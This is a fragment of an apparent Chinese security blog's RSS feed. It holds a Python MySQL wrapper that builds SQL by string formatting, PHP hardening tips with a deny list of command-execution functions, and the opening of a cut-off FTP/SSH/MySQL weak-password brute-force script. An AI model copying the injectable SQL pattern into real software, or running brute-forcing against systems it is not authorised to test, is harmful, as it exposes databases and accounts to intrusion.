&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>_cursor&lt;span style="color:#f92672">.&lt;/span>execute(sql)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>_conn&lt;span style="color:#f92672">.&lt;/span>commit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>rollback()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>_cursor&lt;span style="color:#f92672">.&lt;/span>lastrowid &lt;span style="color:#75715e">#返回最后的id&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">update&lt;/span>(self, table, tdict, condition&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> condition:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;must have id&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> condition &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;where &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> condition
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> value &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> key &lt;span style="color:#f92672">in&lt;/span> tdict:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> value &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;,&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">=&amp;#39;&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (key,tdict[key])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> value &lt;span style="color:#f92672">=&lt;/span> value[&lt;span style="color:#ae81ff">1&lt;/span>:]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sql &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;update &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74"> set &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (table,value,condition)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>_cursor&lt;span style="color:#f92672">.&lt;/span>execute(sql)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>rollback()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>affected_num() &lt;span style="color:#75715e">#返回受影响行数&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">delete&lt;/span>(self, table, condition&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> condition &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;where &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> condition &lt;span style="color:#66d9ef">if&lt;/span> condition &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sql &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;delete from &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (table,condition)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>_cursor&lt;span style="color:#f92672">.&lt;/span>execute(sql)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>_conn&lt;span style="color:#f92672">.&lt;/span>commit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>rollback()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>affected_num() &lt;span style="color:#75715e">#返回受影响行数&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">rollback&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>_conn&lt;span style="color:#f92672">.&lt;/span>rollback()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">affected_num&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>_cursor&lt;span style="color:#f92672">.&lt;/span>rowcount
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __del__(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>_cursor&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>_conn&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">close&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>__del__()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;__main__&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dbconfig &lt;span style="color:#f92672">=&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;host&amp;#39;&lt;/span>:&lt;span style="color:#e6db74">&amp;#39;192.168.188.134&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;port&amp;#39;&lt;/span>:&lt;span style="color:#ae81ff">3306&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;user&amp;#39;&lt;/span>:&lt;span style="color:#e6db74">&amp;#39;python&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;passwd&amp;#39;&lt;/span>:&lt;span style="color:#e6db74">&amp;#39;123456&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;dbname&amp;#39;&lt;/span>:&lt;span style="color:#e6db74">&amp;#39;python&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;charset&amp;#39;&lt;/span>:&lt;span style="color:#e6db74">&amp;#39;utf8&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> db &lt;span style="color:#f92672">=&lt;/span> mysql(dbconfig)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># print db.select(&amp;#39;msg&amp;#39;,&amp;#39;id,ip,domain&amp;#39;)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># print db.select(&amp;#39;msg&amp;#39;,&amp;#39;id,ip,domain&amp;#39;,&amp;#39;id&amp;gt;2&amp;#39;)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># print db.affected_num()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># tdict = {&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># &amp;#39;ip&amp;#39;:&amp;#39;111.13.100.91&amp;#39;,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># &amp;#39;domain&amp;#39;:&amp;#39;baidu.com&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># }&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># print db.insert(&amp;#39;msg&amp;#39;, tdict)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># tdict = {&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># &amp;#39;ip&amp;#39;:&amp;#39;111.13.100.91&amp;#39;,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># &amp;#39;domain&amp;#39;:&amp;#39;aaaaa.com&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># }&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># print db.update(&amp;#39;msg&amp;#39;, tdict, &amp;#39;id=5&amp;#39;)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># print db.delete(&amp;#39;msg&amp;#39;, &amp;#39;id&amp;gt;3&amp;#39;)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> db&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x03-pymysql封装代码">0x03 pymysql封装代码&lt;/h3>
&lt;pre tabindex="0">&lt;code>#!/usr/bin/env python
# -*- coding: utf-8 -*-

import urlparse
import pymysql
import contextlib

class MySQLX(object):
 def __init__(self, mysql_uri):
 super(MySQLX, self).__init__()
 self.mysql_uri = mysql_uri
 self.mysql_info = self.mysql_parse_uri()

 def mysql_parse_uri(self):
 p = urlparse.urlparse(self.mysql_uri)
 host = p.hostname
 port = p.port
 user = p.username
 password = p.password
 dbname = p.path.strip(&amp;#39;/&amp;#39;)
 charset = urlparse.parse_qs(p.query)[&amp;#39;charset&amp;#39;][0]

 return {
 &amp;#39;host&amp;#39;: host,
 &amp;#39;port&amp;#39;: port,
 &amp;#39;user&amp;#39;: user,
 &amp;#39;password&amp;#39;: password,
 &amp;#39;db&amp;#39;: dbname,
 &amp;#39;charset&amp;#39;: charset,
 &amp;#39;cursorclass&amp;#39;: pymysql.cursors.DictCursor,
 }

 @contextlib.contextmanager
 def init(self):
 dbconn = pymysql.connect(**self.mysql_info)
 cursor = dbconn.cursor()
 # dbconn = pymysql.connect(
 # host=mysql_info.get(&amp;#39;host&amp;#39;),
 # user=mysql_info.get(&amp;#39;user&amp;#39;),
 # password=mysql_info.get(&amp;#39;password&amp;#39;),
 # db=mysql_info.get(&amp;#39;db&amp;#39;),
 # charset=mysql_info.get(&amp;#39;charset&amp;#39;)
 # )
 # cursor = dbconn.cursor(cursor=pymysql.cursors.DictCursor)

 try:
 yield cursor #这里就是with返回的
 finally:
 dbconn.commit()
 cursor.close()
 dbconn.close()

 def query(self, sql, arg=&amp;#39;&amp;#39;):
 try:
 with self.init() as cursor:
 if arg:

 cursor.execute(sql,arg) #返回受影响行数
 else:
 cursor.execute(sql)
 result = cursor.fetchall() #返回数据格式是[{},{}]
 # result = cursor.fetchone() #返回数据格式是{}
 return result
 except Exception as e:
 print sql,str(e)

if __name__ == &amp;#39;__main__&amp;#39;:
 mysql_uri = &amp;#34;mysql+pymysql://root:root@localhost:3306/rtest?charset=utf8mb4&amp;#34;
 sqlconn = MySQLX(mysql_uri)
 sql = &amp;#34;select * from `msg` where id=%s&amp;#34;
 result = sqlconn.query(sql,&amp;#34;2&amp;#34;)
 print result
&lt;/code>&lt;/pre></description></item><item><title>Tmux 的使用</title><link>https://wyb0.cn/posts/2016/tmux-usage/</link><pubDate>Sat, 10 Sep 2016 16:24:18 +0000</pubDate><guid>https://wyb0.cn/posts/2016/tmux-usage/</guid><description>&lt;h3 id="0x00-tmux-的快捷键前缀">0x00 Tmux 的快捷键前缀&lt;/h3>
&lt;p>在 Tmux 下想要使用快捷键时，需要先按下快捷键前缀，然后再按下快捷键。&lt;/p>
&lt;p>默认情况下，Tmux 的快捷键前缀是 Ctrl+b，即所有的命令都以 Ctrl+b 开头。&lt;/p></description></item><item><title>POC 框架 Pocsuite</title><link>https://wyb0.cn/posts/2016/poc-framework-pocsuite/</link><pubDate>Thu, 08 Sep 2016 20:38:45 +0000</pubDate><guid>https://wyb0.cn/posts/2016/poc-framework-pocsuite/</guid><description>&lt;h3 id="0x00-关于pocsuite">0x00 关于Pocsuite&lt;/h3>
&lt;p>Pocsuite 是知道创宇安全研究团队打造的一款基于漏洞与 POC 的远程漏洞验证框架。可以让我们不用考虑过多的细节，只要考虑验证代码就可以，它封装了一些我们常用的东西，比如requests，在我们平常使用requests是要考虑cookie、要考虑header，但是在框架下则不需要有这些考虑，因为这些东西框架都帮你解决了。&lt;/p></description></item><item><title>Sublime Text 3 几个好用的插件</title><link>https://wyb0.cn/posts/2016/sublime-text3-plugins/</link><pubDate>Fri, 02 Sep 2016 23:07:44 +0000</pubDate><guid>https://wyb0.cn/posts/2016/sublime-text3-plugins/</guid><description>&lt;h3 id="0x00-package-control">0x00 Package Control&lt;/h3>
&lt;p>安装完这个插件后可以更容易的管理(安装、删除、查看等)其他插件&lt;/p>
&lt;ul>
&lt;li>代码安装&lt;br>
ctrl+~快捷键调出console，将下面代码粘贴进去，然后Enter执行(注意单引号)&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>import urllib.request,os; pf = &amp;#39;Package Control.sublime-package&amp;#39;; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open(os.path.join(ipp, pf), &amp;#39;wb&amp;#39;).write(urllib.request.urlopen( &amp;#39;http://sublime.wbond.net/&amp;#39; + pf.replace(&amp;#39; &amp;#39;,&amp;#39;%20&amp;#39;)).read())
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>手动安装
&lt;ul>
&lt;li>点击https://sublime.wbond.net/Package%20Control.sublime-package 下载文件&lt;/li>
&lt;li>将下载的文件放在root path/Data/Installed Packages下&lt;/li>
&lt;li>重启Sublime Text&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>使用方法
&lt;ul>
&lt;li>
&lt;p>Ctrl+Shift+P调出菜单然后选择相应操作
&lt;img src="https://wyb0.cn/img/post/sublime_package_control1.png" alt="40">&lt;/p></description></item><item><title>PHP 安全配置</title><link>https://wyb0.cn/posts/2016/php-safe-configuration/</link><pubDate>Thu, 01 Sep 2016 08:46:03 +0000</pubDate><guid>https://wyb0.cn/posts/2016/php-safe-configuration/</guid><description>&lt;h3 id="0x00-php的配置">0x00 PHP的配置&lt;/h3>
&lt;p>PHP的配置文件为php.ini,其中有些项配置不当的话就会造成一些安全问题&lt;/p>
&lt;h3 id="0x01-远程文件包含">0x01 远程文件包含&lt;/h3>
&lt;ul>
&lt;li>涉及配置项
&lt;ul>
&lt;li>allow_url_include
&lt;ul>
&lt;li>配置为On时允许进行远程文件包含&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>allow_url_fopen
&lt;ul>
&lt;li>配置为On时允许使用函数fopen、file_put_contents&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>配置方案
&lt;ul>
&lt;li>alllow_url_include = Off&lt;/li>
&lt;li>allow_url_fopen = Off&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x02-关闭错误回显">0x02 关闭错误回显&lt;/h3>
&lt;ul>
&lt;li>涉及配置项
&lt;ul>
&lt;li>display_errors
&lt;ul>
&lt;li>配置为On时会显示错误信息&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>配置方案
&lt;ul>
&lt;li>display_errors = Off&lt;/li>
&lt;li>log_errors = On&lt;/li>
&lt;li>error_log = /var/log/php_error.log&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x03-隐藏php版本">0x03 隐藏php版本&lt;/h3>
&lt;ul>
&lt;li>涉及配置项
&lt;ul>
&lt;li>expose_php
&lt;ul>
&lt;li>为Off时会隐藏php版本&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>配置方案
&lt;ul>
&lt;li>expose_php = Off&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x04-魔术引号">0x04 魔术引号&lt;/h3>
&lt;ul>
&lt;li>涉及配置项
&lt;ul>
&lt;li>magic_quotes_gpc
&lt;ul>
&lt;li>过滤get、post、cookie的单引号、双引号、反斜杠、空字符，但不过滤$_SERVER&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>magic_quotes_runtime
&lt;ul>
&lt;li>对文件或数据库中取出的数据进行过滤，可防止二次注入&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>配置方案
&lt;ul>
&lt;li>做逻辑判断时需要去掉反斜杠，所以用全局过滤框架做过滤吧&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x05-安全模式">0x05 安全模式&lt;/h3>
&lt;ul>
&lt;li>涉及配置项
&lt;ul>
&lt;li>safe_mode
&lt;ul>
&lt;li>开启后安全系数提升，但会限制函数使用权限和操作目录文件权限等&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>配置方案
&lt;ul>
&lt;li>在安全模式下可以使用safe_mode_include_dir = /var/www/common来排除某些文件&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x06-目录权限控制">0x06 目录权限控制&lt;/h3>
&lt;ul>
&lt;li>涉及配置项
&lt;ul>
&lt;li>open_basedir
&lt;ul>
&lt;li>开启后可将用户访问范围限定，可防止跨站，但会影响性能&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>配置方案
&lt;ul>
&lt;li>open_basedir = /var/www/web1/:/var/www/web2/ (后面的斜杠不能少)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x07-禁止函数">0x07 禁止函数&lt;/h3>
&lt;ul>
&lt;li>涉及配置项
&lt;ul>
&lt;li>disable_functions
&lt;ul>
&lt;li>禁止某些命令执行函数和文件操作函数的使用&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>配置方案
&lt;ul>
&lt;li>disable_functions = system,passthru,exec,shell_exec,popen,pcntl_exec,
proc_open,chdir,chroot,getcwd,readdir,mkdir,copy,file_get_contents,&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x08-注册全局变量">0x08 注册全局变量&lt;/h3>
&lt;ul>
&lt;li>涉及配置项
&lt;ul>
&lt;li>register_globals
&lt;ul>
&lt;li>值为On是会开启全局注册变量功能&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>配置方案
&lt;ul>
&lt;li>register_globals = Off&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul></description></item><item><title>Python 的模块</title><link>https://wyb0.cn/posts/2016/python-module/</link><pubDate>Wed, 31 Aug 2016 11:22:41 +0000</pubDate><guid>https://wyb0.cn/posts/2016/python-module/</guid><description>&lt;h3 id="0x00-python的模块">0x00 Python的模块&lt;/h3>
&lt;ul>
&lt;li>在python中，任何一个python文件都可以看作一个模块&lt;/li>
&lt;li>不同包下有相同模块名并不会冲突，且包下必须有文件&lt;code>__init__.py&lt;/code>&lt;/li>
&lt;li>from lib import * 意思是从包lib中导入所有模块(若lib为模块名则为导入模块的所有函数)&lt;/li>
&lt;li>from lib.module1 import test 意思是从lib这个包下的module1模块中导入函数test&lt;/li>
&lt;li>import导入模块时会从sys.path输出的结果路径中查找模块然后导入&lt;/li>
&lt;li>&lt;code>sys.path.append('D:/xx/xx/xx/code')&lt;/code>可以添加搜索路径&lt;/li>
&lt;li>使用&lt;code>if __name__ == '__main__':&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-实例">0x01 实例&lt;/h3>
&lt;ul>
&lt;li>文件结构如下&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://wyb0.cn/img/post/python_module_file_tree.png" alt="模块目录结构">&lt;/p></description></item><item><title>Python 实现密码生成器</title><link>https://wyb0.cn/posts/2016/python-password-generator/</link><pubDate>Mon, 29 Aug 2016 15:14:57 +0000</pubDate><guid>https://wyb0.cn/posts/2016/python-password-generator/</guid><description>&lt;h3 id="0x00-简介">0x00 简介&lt;/h3>
&lt;p>有时候需要在网上注册许多账号，如果每个账户密码都一样的话，若被别人得知一个密码则所有账户就都沦陷了，若密码不一样则可能会忘记，在这里就用脚本写一个生成密码的工具，只需输入域名和账户名就可以根据key生成不一样的密码，也可以把域名和账户名写入文件，这样你用户名也可以不用记了。。。&lt;/p></description></item><item><title>Python 实现多线程弱口令爆破</title><link>https://wyb0.cn/posts/2016/python-multi-threaded-weak-password-blasting/</link><pubDate>Fri, 26 Aug 2016 17:53:51 +0000</pubDate><guid>https://wyb0.cn/posts/2016/python-multi-threaded-weak-password-blasting/</guid><description>&lt;h3 id="0x00-脚本">0x00 脚本&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -*- coding: utf-8 -*-&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;this script can bruter ftp/ssh/mysql&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>__author__ &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;reber&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> Queue
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> threading
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> time
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> logging
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> socket
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> optparse &lt;span style="color:#f92672">import&lt;/span> OptionParser
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> paramiko
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> ftplib &lt;span style="color:#f92672">import&lt;/span> FTP
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> MySQLdb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#################公有类#################&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">CommonFun&lt;/span>(object):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;docstring for CommonFun&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> super(CommonFun, self)&lt;span style="color:#f92672">.&lt;/span>__init__()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">set_log&lt;/span>(self,lname):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> logger &lt;span style="color:#f92672">=&lt;/span> logging&lt;span style="color:#f92672">.&lt;/span>getLogger(lname)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> logger&lt;span style="color:#f92672">.&lt;/span>setLevel(logging&lt;span style="color:#f92672">.&lt;/span>DEBUG)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ch &lt;span style="color:#f92672">=&lt;/span> logging&lt;span style="color:#f92672">.&lt;/span>StreamHandler()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ch&lt;span style="color:#f92672">.&lt;/span>setLevel(logging&lt;span style="color:#f92672">.&lt;/span>DEBUG)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
